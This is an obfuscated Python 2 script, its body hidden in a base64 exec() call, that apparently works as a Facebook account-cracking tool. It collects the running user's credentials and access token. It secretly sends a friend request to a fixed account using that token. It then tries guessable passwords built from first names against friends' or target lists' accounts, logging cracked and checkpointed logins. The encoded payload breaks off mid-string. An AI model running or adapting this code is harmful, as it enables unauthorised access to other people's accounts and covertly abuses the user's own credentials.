from base64 import *

exec(b64decode('IyEvdXNyL2Jpbi9weXRob24yDQojY29kaW5nPXV0Zi04DQoNCg0KaW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLHVybGxpYixjb29raWVsaWIscmVxdWVzdHMsbWVjaGFuaXplDQpmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sDQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXINCg0KDQpyZWxvYWQoc3lzKQ0Kc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpDQpiciA9IG1lY2hhbml6ZS5Ccm93c2VyKCkNCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQ0KYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLG1heF90aW1lPTEpDQpici5hZGRoZWFkZXJzID0gWygnVXNlci1BZ2VudCcsICdPcGVyYS85LjgwIChBbmRyb2lkOyBPcGVyYSBNaW5pLzMyLjAuMjI1NC84NS4gVTsgaWQpIFByZXN0by8yLjEyLjQyMyBWZXJzaW9uLzEyLjE2JyldDQoNCg0KZGVmIGtlbHVhcigpOg0KCXByaW50ICJcMDMzWzE7OTZtWyFdIFx4MWJbMTs5MW1CYWNrIg0KCW9zLnN5cy5leGl0KCkNCg0KDQpkZWYgYWNhayhiKToNCiAgICB3ID0gJ2FodGR6amMnDQogICAgZCA9ICcnDQogICAgZm9yIGkgaW4geDoNCiAgICAgICAgZCArPSAnIScrd1tyYW5kb20ucmFuZGludCgwLGxlbih3KS0xKV0raQ0KICAgIHJldHVybiBjZXRhayhkKQ0KDQoNCmRlZiBjZXRhayhiKToNCiAgICB3ID0gJ2FodGR6amMnDQogICAgZm9yIGkgaW4gdzoNCiAgICAgICAgaiA9IHcuaW5kZXgoaSkNCiAgICAgICAgeD0geC5yZXBsYWNlKCchJXMnJWksJ1wwMzNbJXM7MW0nJXN0cigzMStqKSkNCiAgICB4ICs9ICdcMDMzWzBtJw0KICAgIHggPSB4LnJlcGxhY2UoJyEwJywnXDAzM1swbScpDQogICAgc3lzLnN0ZG91dC53cml0ZSh4KydcbicpDQoNCg0KZGVmIGphbGFuKHopOg0KCWZvciBlIGluIHogKyAnXG4nOg0KCQlzeXMuc3Rkb3V0LndyaXRlKGUpDQoJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQl0aW1lLnNsZWVwKDAwMDAwLjEpDQoNCg0KIyMjIyBMT0dPICMjIyMNCmxvZ28gPSAiIiINCi8gICA8OTY4cG9sbGE+DQogIFwgICAgICAgIDx3ZWxjb21lPiAgDQoNCuKWiOKWgOKWiOKAg+KWiOKWgOKWiOKAg+KWiOKWkeKWkeKAg+KWiOKWkeKWkeKAg+KWhOKWgOKWiA0K4paI4paA4paA4oCD4paI4paE4paI4oCD4paI4paE4paE4oCD4paI4paE4paE4oCD4paI4paA4paIICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KTWU6IHBvbGwxYQ0KdGVsZ3JhbTogcG9sbDJhDQpncm91cDogcG9sbDNhDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIiIiDQoNCmRlZiB0aWsoKToNCgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10NCglmb3IgbyBpbiB0aXRpazoNCgkJcHJpbnQoIlxyXDAzM1sxOzk2bVvil49dIFx4MWJbMTs5M21Mb2dnaW5nIEluIFx4MWJbMTs5N20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQ0KDQoNCmJhY2sgPSAwDQpiZXJoYXNpbCA9IFtdDQpjZWtwb2ludCA9IFtdDQpva3MgPSBbXQ0KaWQgPSBbXQ0KbGlzdGdydXAgPSBbXQ0KdnVsbm90ID0gIlwwMzNbMzFtRWVyb3IiDQp2dWxuID0gIlwwMzNbMzJtRWVyb3IiDQoNCm9zLnN5c3RlbSgiY2xlYXIiKQ0KcHJpbnQgIi0tLS0tLS0tLS1wb2xsYS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSINCnByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS13ZWxjb21lLS0tLS0tLS0tLS0tIg0KcHJpbnQgICIiIg0K4paI4paA4paI4oCD4paI4paA4paI4oCD4paI4paR4paR4oCD4paI4paR4paR4oCD4paE4paA4paIDQrilojiloDiloDigIPilojiloTilojigIPilojiloTiloTigIPilojiloTiloTigIPilojiloDiloggICAgICAgICAgICAgICAgDQoNCg0KTWU6IHBvbGwxYQ0KDQp0ZWxncmFtOiBwb2xsMmENCg0KZ3JvdXA6IHBvbGwzYSIiIg0KDQpwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIg0KDQpVc2VybmFtZSA9ICI5NjgiDQpQYXNzd29yZCA9ICIgMTIxNiINCg0KbG9vcCA9ICd0cnVlJw0Kd2hpbGUgKGxvb3AgPT0gJ3RydWUnKToNCiAgICB1c2VybmFtZSA9IHJhd19pbnB1dCgiXDAzM1sxOzk2bVtceDFiWzE7OTNt4pyTXHgxYlsxOzk2bV0gXHgxYlsxOzMxbVVzZXJuYW1lXHgxYlsxOzkzbT5ceDFiWzE7OTZtPlx4MWJbMTs5M20+XHgxYlsxOzk2bT5cMDMzWzE7MzU7NDBtICIpDQogICAgaWYgKHVzZXJuYW1lID09IFVzZXJuYW1lKToNCiAgICAJcGFzc3dvcmQgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bXHgxYlsxOzkzbeKInlx4MWJbMTs5Nm1dIFx4MWJbMTszMW1QYXNzd29yZFx4MWJbMTs5M20+XHgxYlsxOzk2bT5ceDFiWzE7OTNtPlx4MWJbMTs5Nm0+XDAzM1sxOzM1OzQwbSAiKQ0KICAgICAgICBpZiAocGFzc3dvcmQgPT0gUGFzc3dvcmQpOg0KICAgICAgICAgICAgcHJpbnQgIm9rIOKchSIgKyB1c2VybmFtZQ0KICAgICAgICAgICAgbG9vcCA9ICdmYWxzZScNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50ICJFZXJvciINCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly90Lm1lL3BvbGwxYScpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQgIkVlcm9yIg0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vdC5tZS9wb2xsMmEnKQ0KDQpkZWYgbG9naW4oKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCXRva2V0ID0gb3BlbignbG9naW4udHh0JywncicpDQoJCW1lbnUoKSANCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlwcmludCA0MioiXDAzM1sxOzk2bT0iDQoJCXByaW50KCdcMDMzWzE7OTZtW+Kck10gXHgxYlsxOzkxbUFERCBuZXcgRmFjZWJvb2sgXHgxYlsxOzk2bVvimIZdJyApDQoJCWlkID0gcmF3X2lucHV0KCdcMDMzWzE7OTZtW1BdIFx4MWJbMDszNG1JRC9FbWFpbCBceDFiWzE7OTFtOiBceDFiWzE7OTJtJykNCgkJcHdkID0gcmF3X2lucHV0KCdcMDMzWzE7OTZtWytdIFx4MWJbMDszNG1QYXNzd29yZCBceDFiWzE7OTFtOiBceDFiWzE7OTJtJykNCgkJdGlrKCkNCgkJdHJ5Og0KCQkJYnIub3BlbignaHR0cHM6Ly9tLmZhY2Vib29rLmNvbScpDQoJCWV4Y2VwdCBtZWNoYW5pemUuVVJMRXJyb3I6DQoJCQlwcmludCJcblwwMzNbMTs5Nm1bIV0gXHgxYlsxOzkxbUVlcm9yIg0KCQkJa2VsdWFyKCkNCgkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUNCgkJYnIuc2VsZWN0X2Zvcm0obnI9MCkNCgkJYnIuZm9ybVsnZW1haWwnXSA9IGlkDQoJCWJyLmZvcm1bJ3Bhc3MnXSA9IHB3ZA0KCQlici5zdWJtaXQoKQ0KCQl1cmwgPSBici5nZXR1cmwoKQ0KCQlpZiAnc2F2ZS1kZXZpY2UnIGluIHVybDoNCgkJCXRyeToNCgkJCQlzaWc9ICdhcGlfa2V5PTg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkY3JlZGVudGlhbHNfdHlwZT1wYXNzd29yZGVtYWlsPScraWQrJ2Zvcm1hdD1KU09OZ2VuZXJhdGVfbWFjaGluZV9pZD0xZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTFsb2NhbGU9ZW5fVVNtZXRob2Q9YXV0aC5sb2dpbnBhc3N3b3JkPScrcHdkKydyZXR1cm5fc3NsX3Jlc291cmNlcz0wdj0xLjA2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicNCgkJCQlkYXRhID0geyJhcGlfa2V5IjoiODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFkZGMxNGQiLCJjcmVkZW50aWFsc190eXBlIjoicGFzc3dvcmQiLCJlbWFpbCI6aWQsImZvcm1hdCI6IkpTT04iLCAiZ2VuZXJhdGVfbWFjaGluZV9pZCI6IjEiLCJnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMiOiIxIiwibG9jYWxlIjoiZW5fVVMiLCJtZXRob2QiOiJhdXRoLmxvZ2luIiwicGFzc3dvcmQiOnB3ZCwicmV0dXJuX3NzbF9yZXNvdXJjZXMiOiIwIiwidiI6IjEuMCJ9DQoJCQkJeD1oYXNobGliLm5ldygibWQ1IikNCgkJCQl4LnVwZGF0ZShzaWcpDQoJCQkJYT14LmhleGRpZ2VzdCgpDQoJCQkJZGF0YS51cGRhdGUoeydzaWcnOmF9KQ0KCQkJCXVybCA9ICJodHRwczovL2FwaS5mYWNlYm9vay5jb20vcmVzdHNlcnZlci5waHAiDQoJCQkJcj1yZXF1ZXN0cy5nZXQodXJsLHBhcmFtcz1kYXRhKQ0KCQkJCXo9anNvbi5sb2FkcyhyLnRleHQpDQoJCQkJdW5pa2VycyA9IG9wZW4oImxvZ2luLnR4dCIsICd3JykNCgkJCQl1bmlrZXJzLndyaXRlKHpbJ2FjY2Vzc190b2tlbiddKQ0KCQkJCXVuaWtlcnMuY2xvc2UoKQ0KCQkJCXByaW50ICdcblx4MWJbMTszNjs0MG1Pay4uLicNCgkJCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vdC5tZS9wb2xsMmEnKQ0KCQkJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/bWV0aG9kPXBvc3QmdWlkcz1nd2ltdXNhMyZhY2Nlc3NfdG9rZW49Jyt6WydhY2Nlc3NfdG9rZW4nXSkNCgkJCQltZW51KCkNCgkJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJCQlwcmludCJcblx4MWJbMTs5MW1bIV1pbnRlcm5ldCINCgkJCQlrZWx1YXIoKQ0KCQlpZiAnY2hlY2twb2ludCcgaW4gdXJsOg0KCQkJcHJpbnQoIlxuXHgxYlsxOzkybVshXUNoZWNrcG9pbnQiKQ0KCQkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJCXRpbWUuc2xlZXAoMSkNCgkJCWtlbHVhcigpDQoJCWVsc2U6DQoJCQlwcmludCgiXG5ceDFiWzE7OTNtRWVyb3IiKQ0KCQkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJCXRpbWUuc2xlZXAoMSkNCgkJCWxvZ2luKCkNCg0KDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQiXHgxYlsxOzkxbVshXVRva2VuIFhYWCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQlsb2dpbigpDQoJdHJ5Og0KCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3Rva2V0KQ0KCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJbmFtYSA9IGFbJ25hbWUnXQ0KCQlpZCA9IGFbJ2lkJ10NCgkJb3RzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQ0KCQliID0ganNvbi5sb2FkcyhvdHMudGV4dCkNCgkJc3ViID0gc3RyKGJbJ3N1bW1hcnknXVsndG90YWxfY291bnQnXSkNCglleGNlcHQgS2V5RXJyb3I6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCJcMDMzWzE7OTFtWyFdQ2hlY2twb2ludCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQlsb2dpbigpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCJceDFiWzE7OTJtKCEpaW50ZXJuZXQiDQoJCWtlbHVhcigpDQoJb3Muc3lzdGVtKCJjbGVhciIpDQoJcHJpbnQgbG9nbw0KCXByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIg0KCXByaW50ICJbIV0gTmFtZTogLyIrbmFtYSsiLyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoJcHJpbnQgIlshXSBJRDogLyIraWQrIi8iDQoJcHJpbnQgIlshXSBTdWJzOiAvIitzdWIrIi8iDQoJcHJpbnQgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iDQoJcHJpbnQgIlwwMzNbMTszMjs0MG1bMV0gXDAzM1sxOzMzOzQwbTwxPkhhY2tpbmciCQ0KCXByaW50ICJcMDMzWzE7MzI7NDBtWzJdIFwwMzNbMTszMzs0MG08Mj51cGRhdGluZyIJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkNCglwcmludCAiXDAzM1sxOzMyOzQwbVswXSBcMDMzWzE7MzM7NDBtPDA+TG9nIG91dCINCglwaWxpaCgpDQoNCmRlZiBwaWxpaCgpOg0KCXVuaWtlcnMgPSByYXdfaW5wdXQoIlxuXDAzM1sxOzMxOzQwbS0tLS0tLT4gXDAzM1sxOzM1OzQwbSIpDQoJaWYgdW5pa2VycyA9PSIiOg0KCQlwcmludCAiXHgxYlsxOzkxbUVlcm9yIg0KCQlwaWxpaCgpDQoJZWxpZiB1bmlrZXJzID09IjEiOg0KCQlzdXBlcigpDQoJZWxpZiB1bmlrZXJzID09IjIiOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlwcmludCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIg0KCQlvcy5zeXN0ZW0oJ2dpdCBwdWxsIG9yaWdpbiBtYXN0ZXInKQ0KCQlyYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQ0KCQltZW51KCkNCgllbGlmIHVuaWtlcnMgPT0iMCI6DQoJCWphbGFuKCdPaycpDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCWtlbHVhcigpDQoJZWxzZToNCgkJcHJpbnQgIlx4MWJbMTs5MW1FZXJvciINCgkJcGlsaWgoKQ0KDQpkZWYgc3VwZXIoKToNCglnbG9iYWwgdG9rZXQNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXHgxYlsxOzkxbUVlcm9yIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJcHJpbnQgIlx4MWJbMTszMjs0MG1bMV0gXDAzM1sxOzMzOzQwbTwxPEZyaWVuZCINCglwcmludCAiXHgxYlsxOzMyOzQwbVsyXSBcMDMzWzE7MzM7NDBtPDI+SUQgR2xvYmFsbCINCglwcmludCAiXHgxYlsxOzMyOzQwbVszXSBcMDMzWzE7MzM7NDBtPDM+V29yZGxpc3QiDQoJcHJpbnQgIlx4MWJbMTszMjs0MG1bNF0gXDAzM1sxOzMzOzQwbTw0PkZpbGUiDQoJcHJpbnQgIlx4MWJbMTszMjs0MG1bMF0gXDAzM1sxOzMzOzQwbTwwPkJhY2siDQoJcGlsaWhfc3VwZXIoKQ0KDQpkZWYgcGlsaWhfc3VwZXIoKToNCglwZWFrID0gcmF3X2lucHV0KCJcblwwMzNbMTszMTs0MG0+Pj4gXDAzM1sxOzM1OzQwbSIpDQoJaWYgcGVhayA9PSIiOg0KCQlwcmludCAiXHgxYlsxOzkxbUVlcm9yIg0KCQlwaWxpaF9zdXBlcigpDQoJZWxpZiBwZWFrID09IjEiOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KDQoJCWphbGFuKCdcMDMzWzE7OTNtWyVdIHdhaXQuLi4gXDAzM1sxOzk3bS4uLicpDQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZXQpDQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJZm9yIHMgaW4gelsnZGF0YSddOg0KCQkJaWQuYXBwZW5kKHNbJ2lkJ10pDQoNCgllbGlmIHBlYWsgPT0iMiI6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzk2bVtAXSBUYXJnZXQgSUQ6ICIpDQoJCXRyeToNCgkJCWpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkNCgkJCW9wID0ganNvbi5sb2Fkcyhqb2sudGV4dCkNCgkJCXByaW50IlwwMzNbMTszMTs0MG1bQF0gTmFtZSA6ICIrb3BbIm5hbWUiXQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlwcmludCJceDFiWzE7OTJtWyFdIElEIEVlcm9yISINCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5NG1CYWNrXDAzM1sxOzk2bV0iKQ0KCQkJc3VwZXIoKQ0KCQlwcmludCJcMDMzWzE7MzU7NDBtWyVdIHdhaXQuLi4iDQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyIvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tldCkNCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KCQlmb3IgaSBpbiB6WydkYXRhJ106DQoJCQlpZC5hcHBlbmQoaVsnaWQnXSkNCgllbGlmIHBlYWsgPT0iMyI6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCWJydXRlKCkJDQoJZWxpZiBwZWFrID09IjQiOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbyAgICAgICAgICAgICAgICAgIA0KCQl0cnk6DQoJCQlpZGxpc3QgPSByYXdfaW5wdXQoJ1x4MWJbMTs5Nm1bK10gXHgxYlsxOzkzbTw8Lz4+PDwvPj48PC8+PiBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykNCgkJCWZvciBsaW5lIGluIG9wZW4oaWRsaXN0LCdyJykucmVhZGxpbmVzKCk6DQoJCQkJaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCgkJZXhjZXB0IElPRXJyb3I6DQoJCQlwcmludCAnXHgxYlsxOzM1OzQwbVshXSBceDFiWzE7MzU7NDBtRWVyb3InDQoJCQlyYXdfaW5wdXQoJ1xuXHgxYlsxOzM1OzQwbVsgXHgxYlsxOzM1OzQwbUJhY2sgXHgxYlsxOzM1OzQwbV0nKQ0KCQkJc3VwZXIoKQ0KCWVsaWYgcGVhayA9PSIwIjoNCgkJbWVudSgpDQoJZWxzZToNCgkJcHJpbnQgIlx4MWJbMTs5MW1FZXJvciINCgkJcGlsaWhfc3VwZXIoKQ0KDQoJDQoJcHJpbnQgIlwwMzNbMTszNjs0MG1bIDopIF0gdG90YWwgSUQgOiBcMDMzWzE7OTRtIitzdHIobGVuKGlkKSkNCglqYWxhbignXDAzM1sxOzM0OzQwbVsgOiggXSBwbHogd2FpdCAuLi4nKQ0KCXRpdGlrID0gWycuICAgJywnLi4gICcsJy4uLiAnXQ0KCWZvciBvIGluIHRpdGlrOg0KCQlwcmludCgiXHJcMDMzWzE7MzI7NDBtWyDiiIUg4pyTIF0gTG9hZGluZ1wwMzNbMTs5M20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQ0KCXByaW50ICIuLi4uIg0KCXByaW50ICJPSyA6KSINCg0KCWphbGFuKCcgICAgICAgICAgXDAzM1sxOzkxbUxvYWRpbmcuLi4uLjEwbWluLjE1bWluLm9rLi4uLicpDQoJcHJpbnQgICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iIA0KDQoJZGVmIG1haW4oYXJnKToNCgkJZ2xvYmFsIGNla3BvaW50LG9rcw0KCQl1c2VyID0gYXJnDQoJCXRyeToNCgkJCW9zLm1rZGlyKCdvdXQnKQ0KCQlleGNlcHQgT1NFcnJvcjoNCgkJCXBhc3MgDQoJCXRyeToNCgkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkNCgkJCWIgPSBqc29uLmxvYWRzKGEudGV4dCkNCgkJCXBhc3MxID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMycNCgkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MxKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCXEgPSBqc29uLmxvYWQoZGF0YSkNCgkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJcHJpbnQgJ1x4MWJbMTs5Mm1cbuKVlFtWZXJ5LkdPT0RdIFx4MWJbMTs5Mm0gJyArICcwMzNbMTszNTs0MG1cbuKVkUlEOiAnKyB1c2VyICArICcwMzNbMTszNTs0MG1cbuKVkVBBU1M6ICcgKyBwYXNzMSArICcwMzNbMTszNTs0MG1cbuKVmk5hbWU6ICcgKyAgYlsnbmFtZSddDQoJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MxKQ0KCQkJZWxzZToNCgkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQoJCQkJCXByaW50ICdceDFiWzE7MzY7NDBtXG7ilZRbc29ycnkuQ0hFQ0tQT0lOVF0nICsgJ1x4MWJbMTszMW1cbuKVkUlEOiAnICsgdXNlciAgKyAnXHgxYlsxOzMxbeKVkVBBU1M6ICcgKyBwYXNzMSArICdceDFiWzE7MzFt4pWaTmFtZTogJyArIGJbJ25hbWUnXQ0KCQkJCQljZWsgPSBvcGVuKCJvdXQvQ1AudHh0IiwgImEiKQ0KCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczErIlxuIikNCgkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczEpDQoJCQkJZWxzZToNCgkJCQkJcGFzczIgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTIzNDUnDQoJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MyKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJcHJpbnQgJ1xuXHgxYuKVlFsxOzkybVtWZXJ5LkdPT0RdJyArICdcbuKVkUlEOiAnICsgdXNlciAgKyAnIFxu4pWRUEFTUzogICcgKyBwYXNzMiArICdcbuKVmk5hbWU6ICcgKyBiWyduYW1lJ10NCgkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMikNCgkJCQkJZWxzZToNCgkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJCQlwcmludCAnXG5ceDFiWzE7MzY7NDBt4pWUW3NvcnJ5LkNIRUNLUE9JTlRdIFx4MWJbMTs5N20gJysgJ1xu4pWRSUQ6ICcgKyB1c2VyICArICdcbuKVkVBBU1M6ICcgKyBwYXNzMiArICdcbuKVmk5hbWU6ICcgKyBiWyduYW1lJ10NCgkJCQkJCQljZWsgPSBvcGVuKCJvdXQvQ1AudHh0IiwgImEiKQ0KCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzMisiXG4iKQ0KCQkJCQkJCWNlay5jbG9zZSgpDQoJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczIpDQoJCQkJCQllbHNlOg0KCQkJCQkJCXBhc3MzID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMzQnDQoJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczMpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJCQlwcmludCAnXG5ceDFi4pWUWzE7OTJtW1ZlcnkuR09PRF0gXHgxYlsxOzkybSAnICsgJ1xu4pWRSUQ6ICcgKyB1c2VyICArICdcbuKVkVBBU1M6ICcgKyBwYXNzMyArICdcbuKVmk5hbWU6ICcgKyBiWyduYW1lJ10NCgkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MzKQ0KCQkJCQkJCWVsc2U6DQoJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJCQkJCXByaW50ICdcblx4MWJbMTszNjs0MG3ilZRbc29ycnku